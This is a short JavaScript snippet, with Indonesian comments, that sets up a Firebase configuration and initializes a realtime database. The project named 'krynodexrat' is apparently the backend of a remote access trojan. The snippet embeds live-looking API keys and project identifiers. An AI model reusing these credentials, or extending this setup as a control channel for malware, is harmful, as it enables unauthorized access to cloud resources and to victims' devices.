// ⚠️ CONFIG ASLI - UPDATE INI!
const FIREBASE_CONFIG = {
  apiKey: "AIzaSyBvlhJRWV8PIH09bHKdUpQKv4x6mT9wCIE",
  authDomain: "krynodexrat.firebaseapp.com",
  databaseURL: "https://krynodexrat-default-rtdb.firebaseio.com",  // ← TAMBAHKAN INI
  projectId: "krynodexrat",
  storageBucket: "krynodexrat.firebasestorage.app",
  messagingSenderId: "465327768431",
  appId: "1:465327768431:web:3e5871b9f80dcbcad1de9a"
};

firebase.initializeApp(FIREBASE_CONFIG);
const db = firebase.database();
